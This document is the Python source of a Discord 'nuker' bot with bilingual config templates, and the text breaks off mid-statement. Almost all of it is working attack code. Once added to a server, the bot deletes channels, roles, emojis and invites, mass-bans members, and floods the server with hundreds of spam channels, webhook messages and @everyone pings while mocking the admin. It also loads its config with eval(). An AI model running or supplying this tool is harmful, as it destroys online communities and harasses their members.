import os
try:
    from sys import platform
    from time import sleep
    from colorama import Fore, Style
    from os.path import sep
    from os.path import split as path_split
    from os import _exit, name, system
    from os.path import isfile, split
    from random import choice
    from threading import Thread
    import discord
    from discord import Intents
    from keyboard import is_pressed
    from math import ceil
    from pyperclip import copy
    from discord.ext import commands
    if platform == 'win32':
        from ctypes import windll
except:
    print('[!] Failed to import one/several modules.')
    print('Do you want to install all modules for the script to work?')
    while True:
        ask = input('[y/n] [>] ').lower()
        if ask not in ['y', 'n']:
            print('Wrong answer')
            continue
        else:
            if ask == 'n':
                exit()
            else:
                from os import system

                system('pip install colorama')
                system('pip install discord.py==1.7.3')
                system('pip install keyboard')
                system('pip install pyperclip')

                from sys import platform
                from time import sleep
                from colorama import Fore, Style
                from os.path import sep
                from os.path import split as path_split
                from os import _exit, name, system
                from os.path import isfile, split
                from random import choice
                from threading import Thread
                import discord
                from discord import Intents
                from keyboard import is_pressed
                from math import ceil
                from pyperclip import copy
                from discord.ext import commands
                if platform == 'win32':
                    from ctypes import windll

config_example_rus = '''
{
    # Bot token
    # str -> TOKEN
    'BOT_TOKEN': 'BOT',

    # Prefix for bot commands
    # str
    'BOT_COMMAND_PREFIX': '!',

    # Name for crusher channels
    # str
    'CHANNELS_NAME': 'SERVER CRASH',

    # Spam text
    # str
    'SPAM_TEXT': '@everyone SERVER CRASH IN PROGRESS!',

    # Reason for ban
    # str
    'BAN_REASON': 'Just because',

    # New server name
    # str
    'RENAME_SERVER_TO': 'SERVER CRASHED🤡',

    # New name for roles
    # str
    'ROLES_NAME': 'CRASH',

    # Spam members in PM
    # str
    'DM_SPAM': 'SERVER CRASH IN PROGRESS!',

    # Message when launching crasher
    # str
    'NUKER_START_MESSAGE': '\'\'@everyone\nDear members of this server!\nUnfortunately, the admin or moderator of this server turned out to be a 🦣 and added me to the server :clap:\nServer crash will start in 3 seconds! :clown:\'\'\',

    # Should the start message be sent?
    # bool -> True|False
    'SHOW_START_MESSAGE': True,

    # Автоматически выходить из сервера после указанного времени
    # bool -> True|False
    'AUTO_LEAVE': True,

    # Через сколько автоматически уходить с сервера
    # int -> Seconds
    'AUTO_LEAVE_SEC': 240,

    'NUKER_OPTIONS': {

        # Переименовывать сервер?
        # bool -> True|False
        'RENAME_GUILD': True,

        # Очистить сообщения?
        # bool -> True|False
        'PURGE': True,

        # Спамить участникам в ЛС?
        # Рекомендую оставить False, если на сервере больше 100 участников.
        # bool -> True|False
        'FLOOD_DM': False,

        # Удалить все каналы, и создать новые?
        # bool -> True|False
        'CREATE_CHANNELS': True,

        # False - создаёт только текстовые каналы
        # True - создаёт {текстовый канал|голосовой канал|категорию}
        # bool -> True|False
        'CHANNELS_TYPE_RANDOM': True,

        # Пересоздать ли роли?
        # bool -> True|False
        'CDROLES': True,

        # Банить ли участников?
        # bool -> True|False
        'BAN_MEMBERS': True,

        # Удалять ли эмодзи?
        # bool -> True|False
        'DELETE_EMOJIS': True,

        # Удалять ли приглашения?
        # bool -> True|False
        'DELETE_INVITES': True,

        # Спамить ли на всех каналах?
        # bool -> True|False
        'TOTAL_SPAM': True,

        # Создавать ли много вебхуков?
        # bool -> True|False
        'CREATE_WEBHOOKS': True,

        # Спамить ли вебхуками?
        # bool -> True|False
        'SPAM_WEBHOOKS': True,

        # Удалять ли шаблоны?
        # bool -> True|False
        'DELETE_TEMPLATES': True,

        # Менять ли иконку сервера?
        # bool -> True|False
        'CHANGE_SERVER_ICON': True,

        # Файл с иконкой сервера
        'SERVER_ICON': 'sample.png'

    },

    # Участники, которых не нужно банить.
    # array list[str -> example#0000, ...]
    'BAN_EXCLUDES':
        [
            'friend#0001',
            'test#0002'
        ],

    # Имена для вебхуков
    # array list[str, ...]
    'WEBHOOK_NAMES':
        [
            'spam-webhook',
            'friend',
            'test'
        ]
}
'''

config_example_en = '''
{
    # Token of bot
    'BOT_TOKEN': 'TOKEN',

    # Bot command prefix
    'BOT_COMMAND_PREFIX': '!',

    # New channels name
    'CHANNELS_NAME': 'SERVER CRASHED',

    # Spamming text
    'SPAM_TEXT': '@everyone THIS SERVER WAS CRASHING! :clown:',

    # Ban reason
    'BAN_REASON': 'No reason, LOL',

    # New server name
    'RENAME_SERVER_TO': 'CLOWNS 🤡',

    # Roles name
    'ROLES_NAME': 'CRASH',

    # Members DM spam text
    'DM_SPAM': 'DANGER! THIS SERVER WAS CRASHING!',

    # Message on start
    'NUKER_START_MESSAGE': \'\'\'@everyone\nMembers of this server!\nUnfortunately, the admin or moderator of this server turned out to be 🦣, and added me to the server :clap:\nThe server will be crashed in 3 seconds! :clown:\'\'\',

    # Do send start message?
    'SHOW_START_MESSAGE': True,

    # Enable Auto-Leave
    'AUTO_LEAVE': True,

    # Auto-Leave: Run after
    'AUTO_LEAVE_SEC': 240,

    'NUKER_OPTIONS': {

        # Rename this server?
        'RENAME_GUILD': True,

        # Clear messages?
        'PURGE': True,

        # Do spamming members to DM?
        # Set it to False, if server has > 100 members.
        'FLOOD_DM': False,

        # Delete all channels and create new?
        'CREATE_CHANNELS': True,

        # False - creates ONLY text channels
        # True - creates {text channel|voice channel|category}
        'CHANNELS_TYPE_RANDOM': True,

        # Delete old roles and create new?
        'CDROLES': True,

        # Massban?
        'BAN_MEMBERS': True,

        # Delete all emojis from server?
        'DELETE_EMOJIS': True,

        # Delete all invites from server?
        'DELETE_INVITES': True,

        # Spam on all channels?
        'TOTAL_SPAM': True,

        # Create webhooks?
        'CREATE_WEBHOOKS': True,

        # Spam new webhooks?
        'SPAM_WEBHOOKS': True,

        # Delete server tempates?
        'DELETE_TEMPLATES': True,

        # Change icon of server?
        'CHANGE_SERVER_ICON': True,

        # File with new server icon
        'SERVER_ICON': 'sample.png'

    },

    # Ban excludes.
    'BAN_EXCLUDES':
        [
            'friend#0001',
            'test#0002'
        ],

    # Names for new webhooks
    'WEBHOOK_NAMES':
        [
            'spam-webhook',
            'friend',
            'test'
        ]
}
'''

colorama_colors = [
    Fore.BLACK, Fore.BLUE, Fore.CYAN, Fore.GREEN, Fore.LIGHTBLACK_EX,
    Fore.LIGHTBLUE_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTGREEN_EX,
    Fore.LIGHTMAGENTA_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX, Fore.MAGENTA,
    Fore.RED, Fore.WHITE, Fore.YELLOW
]


def __SlowType(text: str, speed: float, newLine=True):
    for i in text:
        print(i, end="", flush=True)

        if i not in colorama_colors:
            sleep(speed)
    if newLine:
        print()


def SlowType(content):
    __SlowType(content, .005, True)


label = """
  ██████╗ ██████╗  ██╗   ██╗ ██████╗  ████████╗  ██████╗ 
 ██╔════╝ ██╔══██╗ ╚██╗ ██╔╝ ██╔══██╗ ╚══██╔══╝ ██╔═══██╗
 ██║      ██████╔╝  ╚████╔╝  ██████╔╝    ██║    ██║   ██║
 ██║      ██╔══██╗   ╚██╔╝   ██╔═══╝     ██║    ██║   ██║
 ╚██████╗ ██║  ██║    ██║    ██║         ██║    ╚██████╔╝
  ╚═════╝ ╚═╝  ╚═╝    ╚═╝    ╚═╝         ╚═╝     ╚═════╝
"""

folder = path_split(__file__)[0] + sep
os.system("title Made By Eh3an_KenZo")

def ResetColor():
    return Style.RESET_ALL


if platform == 'win32':

    class exceptions:

        class InvalidModeException(Exception):
            pass

    def __fq_seq(color):
        return '\033[38;5;%dm' % color

    def __bg_seq(color):
        return '\033[48;5;%dm' % color

    reset_seq = '\033[0m'

    def GetColor(color, mode='bg'):
        if mode == 'bg':
            color = __bg_seq(color)
        elif mode == 'fg':
            color = __fq_seq(color)
        else:
            raise exceptions.InvalidModeException(
                'Invalid mode. Select one of this: bg - Background, fg - Foreground'
            )

        return color

    def RainbowColorize_L(text, mode='bg', colors=[], splittener=''):

        letters = []

        if splittener != '':
            for letter in text.split(splittener):
                letters.append(letter)
        else:
            for letter in text:
                letters.append(letter)

        index = 0
        lindex = 0

        for x in letters:

            if index >= len(colors):
                index = 0

            color_ = colors[index]
            letters[lindex] = GetColor(color_, mode) + letters[lindex]

            index += 1
            lindex += 1

        letters[-1] = letters[-1] + ResetColor()

        return splittener.join(letters)


Clear = lambda: system('cls' if name == 'nt' else 'clear')
Clear()

if platform != 'win32':
    while True:
        if split(__file__)[1] == 'nuker.py':
            SlowType(
                f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Incorrect file name: nuker.py - is standard file name for configs. Rename this file.{Fore.WHITE}',
            )
            _exit(1)
        SlowType(
            f'{Fore.YELLOW}Выберите язык/Select language\n\n1 - Russian/Русский\n2 - English/Английский'
        )
        lang = input(f'{Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}')

        if lang in ['1', '2']:
            lang = int(lang)
            break

        else:
            SlowType(
                f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] {Fore.YELLOW}Неверное число/Incorrect number.\n'
            )
            sleep(2)
            Clear()
else:
    from locale import windows_locale
    kernel = windll.kernel32
    locale = windows_locale[kernel.GetUserDefaultUILanguage()]

    if locale == 'ru_RU':
        lang = 1
    else:
        lang = 2

    if split(__file__)[1] == 'nuker.py':
        SlowType(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Неверное имя файла: nuker.py - стандартное имя для конфигов. Переименуйте этот файл.{Fore.WHITE}'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Incorrect file name: nuker.py - is standard file name for configs. Rename this file.{Fore.WHITE}'
        )
        _exit(1)

    print(
        f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Locale-Detector: Установлен русский язык.\n'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Locale-Detector: Set english language.\n'
    )

Clear()

from random import choice

colors_palitre = [[160, 161, 162, 163, 164, 165, 171, 177, 183, 189, 195],
                  [93, 99, 105, 111, 117, 123, 122, 121, 120, 119, 118],
                  [21, 27, 33, 39, 45, 51, 50, 49, 48, 47, 46],
                  [46, 47, 48, 49, 50, 51, 45, 39, 33, 27, 21]]


def ShowLabel():
    if platform == 'win32':
        palitre = choice(colors_palitre)
        print(RainbowColorize_L(label, 'fg', palitre, '\n'))

    else:
        print(Fore.RED + label)


autosearch_errored = False

if isfile(folder + 'nuker.py'):
    try:
        config = open(folder + 'nuker.py', 'r', encoding='utf-8')
        data = eval(config.read())
        config.close()

        keys = list(data.keys())

        if 'BOT_TOKEN' not in keys:
            raise NameError('BOT_TOKEN не найден в конфиге' if lang ==
                            1 else 'BOT_TOKEN not found in config')
        if 'BOT_COMMAND_PREFIX' not in keys:
            raise NameError('BOT_COMMAND_PREFIX не найден в конфиге' if lang ==
                            1 else 'BOT_COMMAND_PREFIX not found in config')
        if 'AUTO_LEAVE' not in keys:
            raise NameError('AUTO_LEAVE не найден в конфиге' if lang ==
                            1 else 'AUTO_LEAVE not found in config')
        if 'AUTO_LEAVE_SEC' not in keys:
            raise NameError('AUTO_LEAVE_SEC не найден в конфиге' if lang ==
                            1 else 'AUTO_LEAVE_SEC not found in config')
        if 'CHANNELS_NAME' not in keys:
            raise NameError('CHANNELS_NAME не найден в конфиге' if lang ==
                            1 else 'CHANNELS_NAME not found in config')
        if 'SPAM_TEXT' not in keys:
            raise NameError('SPAM_TEXT не найден в конфиге' if lang ==
                            1 else 'SPAM_TEXT not found in config')
        if 'BAN_REASON' not in keys:
            raise NameError('BAN_REASON не найден в конфиге' if lang ==
                            1 else 'BAN_REASON not found in config')
        if 'RENAME_SERVER_TO' not in keys:
            raise NameError('RENAME_SERVER_TO не найден в конфиге' if lang ==
                            1 else 'RENAME_SERVER not found in config')
        if 'ROLES_NAME' not in keys:
            raise NameError('ROLES_NAME не найден в конфиге' if lang ==
                            1 else 'ROLES_NAME not found in config')
        if 'DM_SPAM' not in keys:
            raise NameError('DM_SPAM не найден в конфиге' if lang ==
                            1 else 'SM_SPAM not found in config')
        if 'NUKER_START_MESSAGE' not in keys:
            raise NameError(
                'NUKER_START_MESSAGE не найден в конфиге' if lang ==
                1 else 'NUKER_START_MESSAGE not found in config')
        if 'SHOW_START_MESSAGE' not in keys:
            raise NameError('SHOW_START_MESSAGE не найден в конфиге' if lang ==
                            1 else 'SHOW_START_MESSAGE not found in config')
        if 'BAN_EXCLUDES' not in keys:
            raise NameError('BAN_EXCLUDES не найден в конфиге' if lang ==
                            1 else 'BAN_EXCLUDES not found in config')
        if 'WEBHOOK_NAMES' not in keys:
            raise NameError('WEBHOOK_NAMES не найден в конфиге' if lang ==
                            1 else 'WEBHOOK_NAMES not found in config')
        if 'NUKER_OPTIONS' not in keys:
            raise NameError('NUKER_OPTIONS не найден в конфиге' if lang ==
                            1 else 'NUKER_OPTIONS not found in config')

        keys = list(data['NUKER_OPTIONS'].keys())

        if 'RENAME_GUILD' not in keys:
            raise NameError(
                'NUKER_OPTIONS/RENAME_GUILD не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/RENAME_GUILD not found in config')
        if 'SERVER_ICON' not in keys:
            raise NameError(
                'NUKER_OPTIONS/SERVER_ICON не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/SERVER_ICON not found in config')
        if 'CHANGE_SERVER_ICON' not in keys:
            raise NameError(
                'NUKER_OPTIONS/CHANGE_SERVER_ICON не найден в конфиге'
                if lang ==
                1 else 'NUKER_OPTIONS/CHANGE_SERVER_ICON not found in config')
        if 'PURGE' not in keys:
            raise NameError(
                'NUKER_OPTIONS/PURGE не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/PURGE not found in config')
        if 'FLOOD_DM' not in keys:
            raise NameError(
                'NUKER_OPTIONS/FLOOD_DM не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/FLOOD_DM not found in config')
        if 'CREATE_CHANNELS' not in keys:
            raise NameError(
                'NUKER_OPTIONS/SPAM_CHANNELS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/CREATE_CHANNELS not found in config')
        if 'CDROLES' not in keys:
            raise NameError(
                'NUKER_OPTIONS/CDROLES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/CD_ROLES not found in config')
        if 'BAN_MEMBERS' not in keys:
            raise NameError(
                'NUKER_OPTIONS/BAN_MEMBERS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/BAN_MEMBERS not found in config')
        if 'DELETE_EMOJIS' not in keys:
            raise NameError(
                'NUKER_OPTIONS/DELETE_EMOJIS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/DELETE_EMOJIS not found in config')
        if 'DELETE_INVITES' not in keys:
            raise NameError(
                'NUKER_OPTIONS/DELETE_INVITES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/DELETE_INVITES not found in config')
        if 'TOTAL_SPAM' not in keys:
            raise NameError(
                'NUKER_OPTIONS/TOTAL_SPAM не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/TOTAL_SPAM not found in config')
        if 'CREATE_WEBHOOKS' not in keys:
            raise NameError(
                'NUKER_OPTIONS/CREATE_WEBHOOKS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/CREATE_WEBHOOKS not found in config')
        if 'DELETE_TEMPLATES' not in keys:
            raise NameError(
                'NUKER_OPTIONS/DELETE_TEMPLATES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/DELETE_TEMPLATES not found in config')
        is_found = True
    except Exception as e:
        autosearch_errored = True
        is_found = False
        SlowType(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Авто-обнаружение: Ошибка чтения конфига: {e}{Fore.WHITE}'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Auto-Detect: Error reading config: {e}{Fore.WHITE}'
        )
        SlowType(
            f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Укажите другой файл или исправьте ошибку в ./nuker.py'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Insert other file or fix error in ./nuker.py'
        )
else:
    is_found = False

if not is_found and autosearch_errored:
    print('\n')
ShowLabel()

if is_found == False:
    while True:
        SlowType(
            f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}Если у вас нет файла с конфигом, введите название несуществующего файла.\n'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}i{Fore.RED}] {Fore.YELLOW}If you dont have config file, enter incorrect file name.\n'
        )

        SlowType(f'{Fore.YELLOW}Введите имя файла с конфигом' if lang ==
                 1 else f'{Fore.YELLOW}Enter config file name')

        config = input(f'{Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}')

        if isfile(config):
            break
        else:
            SlowType(
                f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Файл не найден!'
                if lang == 1 else
                f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}File not found!'
            )

            while True:
                SlowType(
                    f'{Fore.YELLOW}Желаете ли вы создать файл с примером? (Y/N)'
                    if lang == 1 else
                    f'{Fore.YELLOW}Do you want create a file with example? (Y/N)'
                )
                ask = input(
                    f'{Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.WHITE}')
                if ask not in ('y', 'n'):
                    SlowType(
                        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Введите Y или N.'
                        if lang == 1 else
                        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Input Y or N.'
                    )
                else:
                    if ask == 'n':
                        SlowType(
                            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Действие отменено.'
                            if lang == 1 else
                            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Action cancelled.'
                        )
                        break
                    elif ask == 'y':
                        file = open(folder + 'nuker.py', 'w', encoding='utf-8')
                        file.write(config_example_rus if lang ==
                                   1 else config_example_en)
                        file.close()
                        SlowType(
                            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Файл создан в ./nuker.py, отредактируйте токен и запустите скрипт.{Fore.WHITE}'
                            if lang == 1 else
                            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}File created in ./nuker.py, insert token and restart script.{Fore.WHITE}'
                        )
                        _exit(0)

    try:
        config = open(config, 'r', encoding='utf-8')
        data = eval(config.read())
        config.close()

        keys = list(data.keys())

        if 'BOT_TOKEN' not in keys:
            raise NameError('BOT_TOKEN не найден в конфиге' if lang ==
                            1 else 'BOT_TOKEN not found in config')
        if 'BOT_COMMAND_PREFIX' not in keys:
            raise NameError('BOT_COMMAND_PREFIX не найден в конфиге' if lang ==
                            1 else 'BOT_COMMAND_PREFIX not found in config')
        if 'CHANNELS_NAME' not in keys:
            raise NameError('CHANNELS_NAME не найден в конфиге' if lang ==
                            1 else 'CHANNELS_NAME not found in config')
        if 'SPAM_TEXT' not in keys:
            raise NameError('SPAM_TEXT не найден в конфиге' if lang ==
                            1 else 'SPAM_TEXT not found in config')
        if 'BAN_REASON' not in keys:
            raise NameError('BAN_REASON не найден в конфиге' if lang ==
                            1 else 'BAN_REASON not found in config')
        if 'RENAME_SERVER_TO' not in keys:
            raise NameError('RENAME_SERVER_TO не найден в конфиге' if lang ==
                            1 else 'RENAME_SERVER not found in config')
        if 'ROLES_NAME' not in keys:
            raise NameError('ROLES_NAME не найден в конфиге' if lang ==
                            1 else 'ROLES_NAME not found in config')
        if 'DM_SPAM' not in keys:
            raise NameError('DM_SPAM не найден в конфиге' if lang ==
                            1 else 'SM_SPAM not found in config')
        if 'NUKER_START_MESSAGE' not in keys:
            raise NameError(
                'NUKER_START_MESSAGE не найден в конфиге' if lang ==
                1 else 'NUKER_START_MESSAGE not found in config')
        if 'SHOW_START_MESSAGE' not in keys:
            raise NameError('SHOW_START_MESSAGE не найден в конфиге' if lang ==
                            1 else 'SHOW_START_MESSAGE not found in config')
        if 'BAN_EXCLUDES' not in keys:
            raise NameError('BAN_EXCLUDES не найден в конфиге' if lang ==
                            1 else 'BAN_EXCLUDES not found in config')
        if 'WEBHOOK_NAMES' not in keys:
            raise NameError('WEBHOOK_NAMES не найден в конфиге' if lang ==
                            1 else 'WEBHOOK_NAMES not found in config')
        if 'NUKER_OPTIONS' not in keys:
            raise NameError('NUKER_OPTIONS не найден в конфиге' if lang ==
                            1 else 'NUKER_OPTIONS not found in config')

        keys = list(data['NUKER_OPTIONS'].keys())

        if 'RENAME_GUILD' not in keys:
            raise NameError(
                'NUKER_OPTIONS/RENAME_GUILD не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/RENAME_GUILD not found in config')
        if 'PURGE' not in keys:
            raise NameError(
                'NUKER_OPTIONS/PURGE не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/PURGE not found in config')
        if 'FLOOD_DM' not in keys:
            raise NameError(
                'NUKER_OPTIONS/FLOOD_DM не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/FLOOD_DM not found in config')
        if 'CREATE_CHANNELS' not in keys:
            raise NameError(
                'NUKER_OPTIONS/SPAM_CHANNELS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/CREATE_CHANNELS not found in config')
        if 'CDROLES' not in keys:
            raise NameError(
                'NUKER_OPTIONS/CDROLES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/CD_ROLES not found in config')
        if 'BAN_MEMBERS' not in keys:
            raise NameError(
                'NUKER_OPTIONS/BAN_MEMBERS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/BAN_MEMBERS not found in config')
        if 'DELETE_EMOJIS' not in keys:
            raise NameError(
                'NUKER_OPTIONS/DELETE_EMOJIS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/DELETE_EMOJIS not found in config')
        if 'DELETE_INVITES' not in keys:
            raise NameError(
                'NUKER_OPTIONS/DELETE_INVITES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/DELETE_INVITES not found in config')
        if 'TOTAL_SPAM' not in keys:
            raise NameError(
                'NUKER_OPTIONS/TOTAL_SPAM не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/TOTAL_SPAM not found in config')
        if 'CREATE_WEBHOOKS' not in keys:
            raise NameError(
                'NUKER_OPTIONS/CREATE_WEBHOOKS не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/CREATE_WEBHOOKS not found in config')
        if 'DELETE_TEMPLATES' not in keys:
            raise NameError(
                'NUKER_OPTIONS/DELETE_TEMPLATES не найден в конфиге' if lang ==
                1 else 'NUKER_OPTIONS/DELETE_TEMPLATES not found in config')
    except Exception as e:
        SlowType(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Ошибка чтения конфига: {e}{Fore.WHITE}'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Error reading config: {e}{Fore.WHITE}'
        )
        _exit(0)

Clear()

ShowLabel()

SlowType(Fore.YELLOW + 'Авторизация бота...' if lang == 1 else Fore.YELLOW +
         'Logging in...')

import asyncio

if platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
else:
    asyncio.set_event_loop_policy(asyncio.DefaultEventLoopPolicy())

intents = Intents.all()
intents.members = True

Client = commands.Bot(command_prefix=data['BOT_COMMAND_PREFIX'],
                      intents=intents)

CreatedWebhooks = 0


async def CREATE_WEBHOOK(context, channel):
    try:
        WebhookName = choice(data['WEBHOOK_NAMES'])
        Webhook = await channel.create_webhook(name=WebhookName)
        CreatedWebhooks += 1
        print(Fore.RED +
              f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Webhook.id}/Вебхук - Создан вебхук' if lang ==
              1 else Fore.RED +
              f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Webhook.id}/Webhook - Created webhook')
        if data['NUKER_OPTIONS']['SPAM_WEBHOOKS']:
            for _ in range(5):
                try:
                    await Webhook.send(data['SPAM_TEXT'])
                except:
                    print(
                        Fore.RED +
                        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Webhook.id}/Вебхук - Спам вебхуками: Рейт-лимит'
                        if lang == 1 else Fore.RED +
                        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Webhook.id}/Webhook - Webhook spam: Ratelimited'
                    )
                    await asyncio.sleep(2)
    except:
        pass


async def CREATE_ROLE(context):
    try:
        role = await context.guild.create_role(name=data['ROLES_NAME'])
        print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {role.id}/Роль - - Создана роль' if lang ==
              1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {role.id}/Role - Created role')
    except:
        pass


async def DELETE_OBJECT(Object, entityName = 'Unknown Entity||Неизвестный объект'):
    entityName = entityName.split('||')
    if lang == 1:
        entityName = entityName[1]
    else:
        entityName = entityName[0]
    try:
        await Object.delete()
        try:
            print(
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Object.id}/{entityName} - Удалено {Object}' if lang ==
                1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Object.id}/{entityName} - Deleted {Object}')
        except:
            print(
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] Неизвестный ID/{entityName} - Удалено {Object}' if lang ==
                1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] UNKNOWN ID/{entityName} - Deleted {Object}')
    except:
        print(
            f'{Fore.RED}[{Fore.WHITE}-{Fore.RED}] Не удалось удалить: {Object}'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}-{Fore.RED}] Failed to delete: {Object}')


async def BAN(MEMBER):
    try:
        await MEMBER.ban(reason=data['BAN_REASON'])
        print(
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {MEMBER.id}/Участник - {MEMBER} забанен' if lang ==
            1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {MEMBER.id}/Member - {MEMBER} banned')
    except:
        print(
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] Ошибка: {MEMBER.id}/Участник - Не удалось забанить {MEMBER}'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] Error: {MEMBER.id}/Member - Failed to ban {MEMBER}')


async def CM_DELETE_ROLES(context):
    try:
        for role in context.guild.roles:
            asyncio.create_task(DELETE_OBJECT(role))
    except:
        pass


async def CM_CREATE_ROLES(context):
    try:
        for x in range(250):
            asyncio.create_task(CREATE_ROLE(context))
        print(
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] OK - Создано 250 задач по созданию ролей'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] OK - Started 250 tasks to create roles'
        )
    except:
        pass


async def FLOOD_CHANNEL(channel):
    for _ in range(5):
        await channel.send(data['SPAM_TEXT'])


def RANDOM_GET_CHANNEL_TYPE():
    return choice(['Category', 'TextChannel', 'VoiceChannel'])


async def NEW_CHANNEL(context):
    try:
        if not data['NUKER_OPTIONS']['CHANNELS_TYPE_RANDOM']:
            ChannelType = 'TextChannel'
        else:
            ChannelType = RANDOM_GET_CHANNEL_TYPE()

        if ChannelType == 'TextChannel':
            channel = await context.guild.create_text_channel(
                data['CHANNELS_NAME'])

            print(
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {channel.id}/Канал - Создан текстовый канал'
                if lang == 1 else
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {channel.id}/Channel - Created text channel'
            )

            if data['NUKER_OPTIONS'][
                    'CREATE_WEBHOOKS'] and CreatedWebhooks < 50:
                asyncio.create_task(CREATE_WEBHOOK(context, channel))

            if data['NUKER_OPTIONS']['TOTAL_SPAM']:
                for _ in range(5):
                    await channel.send(data['SPAM_TEXT'])
        else:
            if ChannelType == 'Category':
                channel = await context.guild.create_category(
                    data['CHANNELS_NAME'])
            elif ChannelType == 'VoiceChannel':
                channel = await context.guild.create_voice_channel(
                    data['CHANNELS_NAME'])
            print(
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {channel.id}/Канал - Создан канал: {ChannelType}'
                if lang == 1 else
                f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {channel.id}/Channel - Created channel: {ChannelType}'
            )

    except:
        pass


async def CM_CDCHANNELS(context):
    try:
        for Channel in context.guild.channels:
            asyncio.create_task(DELETE_OBJECT(Channel))
        for x in range(500):
            asyncio.create_task(NEW_CHANNEL(context))
        print(
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] OK - Создано 500 задач по созданию каналов'
            if lang == 1 else
            f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] OK - Started 500 tasks to create channels'
        )
    except:
        raise


async def CM_MEMBER_BAN(context):
    for member in context.guild.members:
        if (member.name + "#" +
                str(member.discriminator)) not in data['BAN_EXCLUDES']:

            asyncio.create_task(BAN(member))

        else:
            print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {member.id}/Участник - Не будет забанен, так как он в белом листе' if lang ==
          1 else f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {member.id.guild.id}/Member - Not banned, because user in the whitelist')


async def CM_RENAME_GUILD(context):
    await context.guild.edit(name=data['RENAME_SERVER_TO'])
    print(f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {context.guild.id}/Сервер - Сервер переименован' if lang ==
